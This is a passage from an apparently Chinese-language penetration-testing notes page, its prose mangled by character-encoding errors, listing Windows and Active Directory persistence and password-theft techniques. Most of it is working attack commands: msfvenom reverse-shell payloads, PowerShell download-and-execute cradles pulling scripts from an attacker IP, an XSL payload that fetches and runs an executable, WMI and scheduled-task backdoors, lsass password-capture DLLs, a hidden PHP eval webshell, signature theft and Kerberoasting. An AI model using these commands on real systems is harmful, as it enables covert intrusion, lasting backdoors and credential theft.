<p><img src="./img/504.png" alt="image"><br><img src="./img/505.png" alt="image"></p>
<pre><code>&gt;netsh add helper helper.dll
</code></pre>
<p><img src="./img/506.png" alt="image"></p>
<h4 id="MSF-amp-Shellcode"><a href="#MSF-amp-Shellcode" class="headerlink" title="MSF&amp;Shellcode"></a>MSF&amp;Shellcode</h4><pre><code>å…³é—­netshåæƒé™ä¼šæ‰
https://github.com/outflanknl/NetshHelperBeacon
MSFvenomç”Ÿæˆ.cæ ¼å¼
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f c -o /var/www/html/1.c
Visual Studioæ‰“å¼€é¡¹ç›®
è‹¥ç³»ç»Ÿæ˜¯64ä½éœ€è®¾ç½®é…ç½®ç®¡ç†å™¨ä¸º64ä½é¡¹ç›®ï¼Œåä¹‹32(è§£å†³æ–¹æ¡ˆå³é”®å±æ€§)
</code></pre>
<p><img src="./img/507.png" alt="image"></p>
<pre><code>å°†MSFç”Ÿæˆshellcodeç²˜è´´è¿›ç›¸åº”ä½ç½®åç”Ÿæˆè§£å†³æ–¹æ¡ˆã€‚
</code></pre>
<p><img src="./img/508.png" alt="image"><br><img src="./img/509.png" alt="image"></p>
<pre><code>ä¼šåœ¨é¡¹ç›®ç›®å½•x64/Releaseä¸‹ç”Ÿæˆdll
å¤åˆ¶DLLåˆ°é¶æœºsystem32ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤
&gt;netsh add helper C:\Windows\System32\NetshHelperBeacon.dll
</code></pre>
<p><img src="./img/510.png" alt="image"></p>
<pre><code>åªè¦å¯åŠ¨netshå°±ä¼šè§¦å‘
</code></pre>
<p><img src="./img/511.png" alt="image"></p>
<h3 id="MSSQLåé—¨"><a href="#MSSQLåé—¨" class="headerlink" title="MSSQLåé—¨"></a>MSSQLåé—¨</h3><pre><code>æ³¨å†Œè¡¨è‡ªå¯åŠ¨
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1&#39;);Get-SQLPersistRegRun -Verbose -Name Update -Command &#39;c:\windows\temp\Update.exe&#39; -Instance &quot;zone.com\sub2k8&quot;&quot;
é‡å¯MSSQLä¸Šçº¿(éœ€é‡å¯æœåŠ¡)
http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1
&gt;powershell -ep bypass 
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1&#39;) 
&gt;Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance &quot;zone.com\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.0.107/xxxx&#39;)&quot; è¿œç¨‹æœ¨é©¬è„šæœ¬å¯ç”¨CS/Empireç”Ÿæˆ
&gt;net stop mssqlserver
&gt;net start mssqlserver
æ˜ åƒåŠ«æŒ
&gt;powershell -nop -ep bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1&#39;);Get-SQLPersistRegDebugger -Verbose -FileName sethc.exe -Command &quot;c:\windows\system32\cmd.exe&quot; -Instance &quot;zone.com\sub2k8&quot;&quot;
DDLäº‹ä»¶è§¦å‘
&gt;powershell -exec bypass 
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/Invoke-SqlServer-Persist-TriggerDDL.psm1&#39;) 
&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot;zone\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.0.107/xxxx&#39;)&quot;  è¿œç¨‹æœ¨é©¬æ–‡ä»¶å¯ç”¨CS/Empireç”Ÿæˆ
&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot; zone\sub2k8&quot; -Remove   ç§»é™¤åé—¨
</code></pre>
<h3 id="NSSM"><a href="#NSSM" class="headerlink" title="NSSM"></a>NSSM</h3><pre><code>http://www.nssm.cc/release/nssm-2.24.zip
NSSMå°è£…å¯æ‰§è¡Œç¨‹åºä¸ºç³»ç»ŸæœåŠ¡
&gt;nssm install æœåŠ¡åç§°ä¼šè‡ªåŠ¨å¼¹å‡ºè®¾ç½®
</code></pre>
<p><img src="./img/512.png" alt="image"></p>
<pre><code>Pathé€‰æ‹©powershellçš„è·¯å¾„ï¼Œargumentsç›´æ¥è¾“å…¥å‚æ•°ã€‚
å¯åŠ¨æœåŠ¡
&gt;nssm start æœåŠ¡åç§°
</code></pre>
<p><img src="./img/513.png" alt="image"></p>
<pre><code>ä¼šä¸Šçº¿
</code></pre>
<p><img src="./img/514.png" alt="image"></p>
<pre><code>é‡å¯ç”µè„‘ï¼Œæƒé™ä¹Ÿä¼šç»´æŒ
åˆ é™¤æœåŠ¡
&gt;nssm remove &lt;servicename&gt;
</code></pre>
<p><img src="./img/515.png" alt="image"></p>
<h3 id="æ·»åŠ ç­¾å"><a href="#æ·»åŠ ç­¾å" class="headerlink" title="æ·»åŠ ç­¾å"></a>æ·»åŠ ç­¾å</h3><pre><code>https://github.com/secretsquirrel/SigThief
&gt;python sigthief.py -i è¢«çªƒå–çš„æ–‡ä»¶ -t è¦æ·»åŠ ç­¾åçš„æ¶æ„æ–‡ä»¶ -o ä¿å­˜æ–‡ä»¶
&gt;python sigthief.py -i rarext.dll -t rarextdwa.dll -o 1.dll
</code></pre>
<p><img src="./img/516.png" alt="image"><br><img src="./img/517.png" alt="image"><br><img src="./img/518.png" alt="image"><br><img src="./img/519.png" alt="image"></p>
<h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><pre><code>Meterpreter&gt; run metsvc -A
åœ¨C:Windows\TEMPä¸‹éšæœºç”Ÿæˆç›®å½•ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ›å»ºæœåŠ¡metsvc 31337ç«¯å£
è¿æ¥åé—¨
Msf&gt;use exploit/multi/handler
Msf&gt;set payload windows/metsvc_bind_tcp
Msf&gt;set rhost 192.168.1.2
Msf&gt;set rport 31337
Msf&gt;run
åˆ é™¤æœåŠ¡
Meterpreter &gt; run metsvc â€“r
</code></pre>
<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><pre><code>Meterpreter&gt;run persistence -X -i 10 -r 192.168.1.9 -p 4444
-Xç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œ
-iæ¯éš”10ç§’å°è¯•è¿æ¥æœåŠ¡ç«¯
è¿æ¥åé—¨
Msf&gt;use exploit/multi/handler
Msf&gt;set payload windows/meterpreter/reverse_tcp
Msf&gt;set lhost 192.168.1.1
Msf&gt;set lport 4444
Msf&gt;run
</code></pre>
<h3 id="HookPasswordChangeNotify"><a href="#HookPasswordChangeNotify" class="headerlink" title="HookPasswordChangeNotify"></a>HookPasswordChangeNotify</h3><pre><code>ä½¿ç”¨VS2015å¼€å‘ç¯å¢ƒï¼ŒMFCè®¾ç½®ä¸ºåœ¨é™æ€åº“ä¸­ä½¿ç”¨MFC
ç¼–è¯‘å·¥ç¨‹ï¼Œç”ŸæˆHookPasswordChange.dll
https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
åœ¨ä»£ç å°¾éƒ¨æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š
&gt;Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
å¹¶å‘½åä¸ºHookPasswordChangeNotify.ps1
ä¸Šä¼ HookPasswordChangeNotify.ps1å’ŒHookPasswordChange.dll
ç®¡ç†å‘˜æƒé™æ‰§è¡Œ
&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
C:\Windows\Tempä¸‹å¯ä»¥æ‰¾åˆ°passwords.txt
&amp;
https://gitee.com/RichChigga/PasswordchangeNotify
ä¸Šä¼ HookPasswordChangeNotify.ps1å’ŒHookPasswordChange.dll ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼š
&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
åœ¨C:\Windows\System32 æ–°å»ºæ–‡ä»¶system.iniç¬¬ä¸€è¡Œæ˜¯è¿æ¥çš„ip ç¬¬äºŒè¡Œæ˜¯ç«¯å£
</code></pre>
<p><img src="./img/520.png" alt="image"></p>
<h3 id="NPPSpyè®°å½•å¯†ç "><a href="#NPPSpyè®°å½•å¯†ç " class="headerlink" title="NPPSpyè®°å½•å¯†ç "></a>NPPSpyè®°å½•å¯†ç </h3><pre><code>https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c
é»˜è®¤ä¿å­˜ä½ç½®æ˜¯Cç›˜æ ¹ç›®å½•ï¼Œå¯ä»¥ä¿®æ”¹é‡æ–°ç¼–è¯‘
</code></pre>
<p><img src="./img/729.png" alt="image"></p>
<pre><code>å°†DLLæ”¾å…¥system32æ–‡ä»¶å¤¹å†…
</code></pre>
<p><img src="./img/730.png" alt="image"></p>
<pre><code>æ‰§è¡Œps1è„šæœ¬è‡ªåŠ¨æ·»åŠ æ³¨å†Œè¡¨
</code></pre>
<p><img src="./img/731.png" alt="image"></p>
<pre><code>æ— éœ€é‡å¯
</code></pre>
<p><img src="./img/732.png" alt="image"></p>
<h3 id="Password-Filter-DLL"><a href="#Password-Filter-DLL" class="headerlink" title="Password Filter DLL"></a>Password Filter DLL</h3><pre><code>https://github.com/3gstudent/PasswordFilter
visualstudioç”Ÿæˆè§£å†³æ–¹æ¡ˆ
DLLæ”¾åœ¨%windir%\system32\ä¸‹
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsaä¸‹çš„Notification Packagesï¼Œæ·»åŠ Win32Project3
</code></pre>
<p><img src="./img/521.png" alt="image"></p>
<pre><code>&gt;REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot;
&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0rassfm\0Win32Project3&quot; /f
é‡å¯ä¹‹ååªè¦ä¿®æ”¹ç”¨æˆ·çš„å¯†ç ï¼Œå³å¯è®°å½•
</code></pre>
<p><img src="./img/522.png" alt="image"></p>
<pre><code>æ–‡ä»¶é»˜è®¤åœ¨Cç›˜æ ¹ç›®å½•ï¼Œå¯åœ¨æºç ä¸­ä¿®æ”¹
</code></pre>
<p><img src="./img/523.png" alt="image"></p>
<h3 id="WMICäº‹ä»¶è®¢é˜…"><a href="#WMICäº‹ä»¶è®¢é˜…" class="headerlink" title="WMICäº‹ä»¶è®¢é˜…"></a>WMICäº‹ä»¶è®¢é˜…</h3><pre><code>æ¯éš”30ç§’åŠ è½½ä¸€æ¬¡payload
&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;
&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;,CommandLineTemplate=&quot;è¿œç¨‹è°ƒç”¨(powershell,regsvr32,mshtaç­‰)&quot;
&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;
</code></pre>
<p><img src="./img/524.png" alt="image"></p>
<pre><code>é‡å¯ç»´æŒ
å¸è½½åé—¨
&gt;Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&#39;BotFilter82&#39;&quot; | Remove-WmiObject -Verbose
&gt;Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#39;BotConsumer23&#39;&quot; | Remove-WmiObject -Verbose
&gt;Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &#39;%BotFilter82%&#39;&quot; | Remove-WmiObject -Verbose
</code></pre>
<h3 id="WMI-Persistence"><a href="#WMI-Persistence" class="headerlink" title="WMI-Persistence"></a>WMI-Persistence</h3><pre><code>https://gitee.com/RichChigga/WMI-Persistence
cobalt strike -&gt;payload generator-&gt;powershell(use x64)
</code></pre>
<p><img src="./img/525.png" alt="image"></p>
<pre><code>attack-&gt;æ–‡ä»¶ä¸‹è½½ï¼Œæ–‡ä»¶é€‰æ‹©payload generatorçš„è„šæœ¬ï¼Œlocal uriä¸ºéšæ„æ–‡ä»¶
</code></pre>
<p><img src="./img/526.png" alt="image"></p>
<pre><code>ç”Ÿæˆååœ°å€æ›¿æ¢è¿›WMI-Persistenceè„šæœ¬å†…
</code></pre>
<p><img src="./img/527.png" alt="image"></p>
<pre><code># powershell -exec bypass
PS &gt; Import-Module .\WMI-Persistence.ps1
PS &gt; Install-Persistence
</code></pre>
<p><img src="./img/528.png" alt="image"></p>
<pre><code>PS &gt; Check-WMI  é‡å¯åå³å¯ä¸Šçº¿systemæƒé™(è¦ç­‰å¾…4-6åˆ†é’Ÿ)
</code></pre>
<p><img src="./img/529.png" alt="image"></p>
<pre><code>è‡ªå®šä¹‰ä¸Šçº¿
</code></pre>
<p><img src="./img/530.png" alt="image"></p>
<pre><code>attack-&gt;æ–‡ä»¶ä¸‹è½½ï¼Œexeæœ¨é©¬æŒ‡å®šä¸ºæ–‡ä»¶ã€‚local uriä¸ºéšæ„æ–‡ä»¶ï¼Œwmi.xslæ”¾åœ¨webç›®å½•
</code></pre>
<p><img src="./img/531.png" alt="image"></p>
<pre><code>ä¿®æ”¹wmi.xsl
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stylesheet</span>
<span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ms</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:xslt<span class="token punctuation">"</span></span>
<span class="token attr-name"><span class="token namespace">xmlns:</span>user</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span>
<span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ms:</span>script</span> <span class="token attr-name">implements-prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token cdata">&lt;![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil -urlcache -split -f http://192.168.0.107/load.jpg %temp%/load.exe &amp; %temp%/load.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/load.jpg delete",0);
    ]]></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ms:</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stylesheet</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="./img/532.png" alt="image"></p>
<pre><code>WMI-Persistenceè„šæœ¬ä¿®æ”¹payloadåœ°å€ä¸ºwmi.xsl
$finalPayload=&quot; wmic os get /FORMAT:`&quot;$Payload`&quot;&quot;
</code></pre>
<p><img src="./img/533.png" alt="image"></p>
<pre><code>&gt;powershell -exec bypass
PS &gt; Import-Module .\WMI-Persistence.ps1
PS &gt; Install-Persistence
PS &gt; Check-WMI
PS &gt; Remove-Persistence åˆ é™¤æ¨¡å—
é‡å¯åå³å¯ä¸Šçº¿
</code></pre>
<p><img src="./img/534.png" alt="image"></p>
<h3 id="Invoke-Tasksbackdoor"><a href="#Invoke-Tasksbackdoor" class="headerlink" title="Invoke-Tasksbackdoor"></a>Invoke-Tasksbackdoor</h3><pre><code>&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.103/Invoke-taskBackdoor.ps1&#39;);Invoke-Tasksbackdoor -method nccat -ip 192.168.0.103 -port 9999 -time 2&quot;
&gt; powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.103/Invoke-taskBackdoor.ps1&#39;);Invoke-Tasksbackdoor -method msf -ip 192.168.0.103 -port 8081 -time 2&quot;
</code></pre>
<p><img src="./img/535.png" alt="image"></p>
<h3 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h3><pre><code>ä½¿ç”¨ADSåˆ›å»ºä¸€ä¸ªéšè—æ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡æ¯éš”ä¸€åˆ†é’Ÿè¯·æ±‚ä¸€æ¬¡æ”»å‡»ã€‚
&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Backdoors/Invoke-ADSBackdoor.ps1&#39;); Invoke-ADSBackdoor -PayloadURL http://192.168.0.107/ps/Schtasks-Backdoor.ps1 -Arguments &#39;Invoke-Tasksbackdoor -method nccat -ip 192.168.0.107 -port 12138 -time 1&#39;&quot;
</code></pre>
<p><img src="./img/536.png" alt="image"><br><img src="./img/537.png" alt="image"><br><img src="./img/538.png" alt="image"><br>    ç”Ÿæˆ<br>    &gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.107 LPORT=12138 -f powershell -o /var/www/html/ads<br>    #use exploit/multi/handler<br>    #set payload windows/x64/meterpreter/reverse_https<br>    #run</p>
<h3 id="ADSéšè—webshell"><a href="#ADSéšè—webshell" class="headerlink" title="ADSéšè—webshell"></a>ADSéšè—webshell</h3><pre><code>æŒ‡å®šå®¿ä¸»æ–‡ä»¶ï¼Œindex.phpæ˜¯ç½‘é¡µæ­£å¸¸æ–‡ä»¶
&gt;echo ^&lt;?php @eval($_POST[&#39;chopper&#39;]);?^&gt; &gt; index.php:hidden.jpg
&lt;?php include(â€˜index.php:hidden.jpgâ€™)?&gt;
&lt;?php 
$a=&quot;696E6465782E7068703&quot;.&quot;A68696464656E2E6A7067&quot;;#hexç¼–ç 
$b=&quot;a&quot;;
include(PACK(&#39;H*&#39;,$$b))
?&gt;
&gt;echo 9527 &gt; 1.txt:flag.txt
&gt;notepad 1.txt:flag.txt
æˆ–ä¸æŒ‡å®šå®¿ä¸»æ–‡ä»¶
&gt;echo hide &gt; :key.txt
&gt;cd ../
&gt;notepad test:key.txt
ä¸Šä¼ å¤„ç»•è¿‡
</code></pre>
<table>
<thead>
<tr>
<th>ä¸Šä¼ çš„æ–‡ä»¶å</th>
<th>æœåŠ¡å™¨è¡¨é¢ç°è±¡</th>
<th>ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td>test.php:a.jpg</td>
<td>ç”Ÿæˆtest.php</td>
<td>ç©º</td>
</tr>
<tr>
<td>test.php::$DATA</td>
<td>ç”Ÿæˆtest.php</td>
<td><?php phpinfo();?></td>
</tr>
<tr>
<td>test.php::$INDEX_ALLOCATION</td>
<td>ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹</td>
<td>\</td>
</tr>
<tr>
<td>test.php::$DATA\0.jpg</td>
<td>ç”Ÿæˆ0.jpg</td>
<td><?php phpinfo();?></td>
</tr>
</tbody></table>
<h3 id="ADS-amp-JavaScript"><a href="#ADS-amp-JavaScript" class="headerlink" title="ADS&amp;JavaScript"></a>ADS&amp;JavaScript</h3><pre><code>åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œtest.txtï¼Œéšä¾¿æ·»åŠ å†…å®¹ï¼ˆå®é™…çš„å·¥å…·ï¼Œå³ç”¨æˆ·è¦ç”¨çš„é‚£ä¸ªå·¥å…·ï¼‰ã€‚
å°†ç¨‹åºå†™å…¥æ–‡ä»¶æµï¼ˆæ­¤å¤„ç”¨calc.exeï¼‰
&gt;type calc.exe &gt; test.txt:calc.exe
ä½¿ç”¨mklinkåˆ›å»ºæ–‡ä»¶é“¾æ¥ï¼š
&gt;mklink config.txt test.txt:calc.exe
åˆ›å»ºreadme.txtï¼Œæ–‡ä»¶å†…å®¹éšä¾¿ã€‚è®¾ç½®ä¸ºéšè—ã€‚
åˆ›å»ºreadme.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š
var objShell = new ActiveXObject(&quot;shell.application&quot;);
objShell.ShellExecute(&quot;cmd.exe&quot;, &quot;/c config.txt&quot;, &quot;&quot;, &quot;open&quot;, 0);
objShell.ShellExecute(&quot;README.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1);
æ‰§è¡Œreadme.jsï¼Œè¿è¡Œcalc.exe ï¼Œæ‰“å¼€readme.txt
</code></pre>
<h3 id="Empire-3"><a href="#Empire-3" class="headerlink" title="Empire"></a>Empire</h3><h4 id="LNKåé—¨"><a href="#LNKåé—¨" class="headerlink" title="LNKåé—¨"></a>LNKåé—¨</h4><pre><code>Empire
Empire&gt; set Host http://192.168.1.150
Empire&gt; set Port 8080
&gt;launcher powershell Listener&#39;s Name
ç”Ÿæˆååªä½¿ç”¨Base64çš„ä»£ç ã€‚
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1&#39;);Invoke-BackdoorLNK -LNKPath &#39;C:\Users\Administrator.DC\Desktop\Easy CHM.lnk&#39; -EncScript Base64ç¼–ç &quot;
</code></pre>
<p><img src="./img/539.png" alt="image"><br><img src="./img/540.png" alt="image"><br><img src="./img/541.png" alt="image"><br><img src="./img/542.png" alt="image"></p>
<pre><code>æ¸…é™¤åé—¨
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1&#39;);Invoke-BackdoorLNK -LNKPath &#39;C:\Users\Administrator.DC\Desktop\Easy CHM.lnk&#39; -CleanUp&quot;
</code></pre>
<p><img src="./img/543.png" alt="image"></p>
<h4 id="WMI-2"><a href="#WMI-2" class="headerlink" title="WMI"></a>WMI</h4><pre><code>Empire&gt;powershell/persistence/elevated/wmi
</code></pre>
<h3 id="æ³¨å…¥SSPè¢«åŠ¨æ”¶é›†å¯†ç "><a href="#æ³¨å…¥SSPè¢«åŠ¨æ”¶é›†å¯†ç " class="headerlink" title="æ³¨å…¥SSPè¢«åŠ¨æ”¶é›†å¯†ç "></a>æ³¨å…¥SSPè¢«åŠ¨æ”¶é›†å¯†ç </h3><pre><code>éœ€é«˜æƒé™
</code></pre>
<h4 id="Mimikatz-3"><a href="#Mimikatz-3" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>é‡å¯å¤±æ•ˆ
&gt;privilege::debug
&gt;misc::memssp
é”å±
&gt;rundll32.exe user32.dll,LockWorkStation
</code></pre>
<p><img src="./img/544.png" alt="image"></p>
<pre><code>ç™»å½•çš„è´¦å·å¯†ç ä¿å­˜åœ¨
C:\Windows\System32\mimilsa.log
</code></pre>
<p><img src="./img/545.png" alt="image"></p>
<pre><code>é‡å¯æœ‰æ•ˆ
å°†mimikatzä¸­çš„mimilib.dllæ”¾å…¥system32ç›®å½•
&gt;reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot; æŸ¥çœ‹æ³¨å†Œè¡¨
&gt;reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ  æ·»åŠ mimilib
</code></pre>
<p><img src="./img/546.png" alt="image"></p>
<pre><code>æœ‰è´¦å·ç™»å½•å¯†ç ä¿å­˜åœ¨C:\Windows\System32\kiwissp.logé‡å¯ä¹Ÿæœ‰æ•ˆ
</code></pre>
<p><img src="./img/547.png" alt="image"></p>
<h4 id="Empire-4"><a href="#Empire-4" class="headerlink" title="Empire"></a>Empire</h4><pre><code>å¤åˆ¶mimilib.dllåˆ°system32æ–‡ä»¶å¤¹ä¸­
&gt;shell copy mimilib.dll C:\Windows\System32\
ä½¿ç”¨æ¨¡å—
&gt;usemodule persistence/misc/install_ssp*
&gt;set Path C:\Users\Administrator\mimilib.dll
</code></pre>
<h4 id="Powersploit-1"><a href="#Powersploit-1" class="headerlink" title="Powersploit"></a>Powersploit</h4><pre><code>&gt;Import-Module .\PowerSploit.psm1
&gt;Install-SSP -Path .\mimilib.dll
</code></pre>
<h3 id="åŸºäºåŸŸç­–ç•¥æ–‡ä»¶æƒé™åé—¨"><a href="#åŸºäºåŸŸç­–ç•¥æ–‡ä»¶æƒé™åé—¨" class="headerlink" title="åŸºäºåŸŸç­–ç•¥æ–‡ä»¶æƒé™åé—¨"></a>åŸºäºåŸŸç­–ç•¥æ–‡ä»¶æƒé™åé—¨</h3><pre><code>åŸŸçš„ç»„ç­–ç•¥å’Œè„šæœ¬å­˜æ”¾åœ¨åŸŸæ§æœºçš„C:\Windows\SYSVOL\sysvol\zone.com\Policiesç›®å½•ï¼ŒåŸŸå†…æœºå™¨å®šæ—¶è®¿é—®ä»¥æ›´æ–°ç­–ç•¥
åŸŸæ§æœºè®¾ç½®policiesä¸ºeveryoneå®Œå…¨æ§åˆ¶
&gt;cacls C:\Windows\SYSVOL\sysvol\zone.com\Policies /e /t /c /g &quot;EveryOne&quot;:f
</code></pre>
<p><img src="./img/548.png" alt="image"></p>
<pre><code>ä½¿ç”¨powerviewæŸ¥è¯¢åŸŸå†…æœºå¯¹åº”ç­–ç•¥æ–‡ä»¶
PS&gt; Get-NETGPO -ComputerName sub2k8.zone.com |fl gpcfilesyspath
æ‰“å¼€C:\Windows\SYSVOL\sysvol\zone.com\Policies\&#123;id&#125;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.infæœ«å°¾æ·»åŠ 
[Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature=&quot;$CHICAGO$&quot; Revision=1
æ‰‹åŠ¨åˆ·æ–°ç­–ç•¥
&gt;gpupdate /force
åŠ«æŒtaskhost.exeï¼Œå¯æ›¿æ¢c:\windows\system32\calc.exeä¸ºåé—¨æ–‡ä»¶æˆ–è¯­å¥ã€‚
</code></pre>
<h3 id="Kerberoastingåé—¨"><a href="#Kerberoastingåé—¨" class="headerlink" title="Kerberoastingåé—¨"></a>Kerberoastingåé—¨</h3><pre><code>å½“æœ‰setspnæƒé™æ—¶ï¼Œä¸ºåŸŸç”¨æˆ·æ·»åŠ ä¸€ä¸ªSPN
&gt;setspn -U -A RDP/zone.com godadmin
</code></pre>
<p><img src="./img/549.png" alt="image"></p>
<pre><code>åŸŸå†…ä»»ä½•ä¸»æœºå¯ä»¥ä½¿ç”¨Kerberoast è·å¾—TGS
https://github.com/malachitheninja/Invoke-Kerberoast
</code></pre>
<p><img src="./img/550.png" alt="image"></p>
<pre><code>&gt;Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation |Out-File xx.txt
</code></pre>
<p><img src="./img/551.png" alt="image"></p>
<pre><code>æˆ–ä½¿ç”¨rubeus.exe
</code></pre>
<p><img src="./img/552.png" alt="image"></p>
<pre><code>ç ´è§£
&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
</code></pre>
<h3 id="S4U2Selfåé—¨"><a href="#S4U2Selfåé—¨" class="headerlink" title="S4U2Selfåé—¨"></a>S4U2Selfåé—¨</h3><pre><code>åŸŸæ§æ‰§è¡Œï¼Œå¯»æ‰¾å…·å¤‡SPNä¸”å¯†ç æ°¸ä¸è¿‡æœŸçš„è´¦æˆ·
&gt;Get-ADUser -Filter * -Properties ServicePrincipalName,PasswordNeverExpires| ? &#123;($_.ServicePrincipalName -ne &quot;&quot;) -and ($_.PasswordNeverExpires -eq $true)&#125;
</code></pre>
<p><img src="./img/553.png" alt="image"></p>
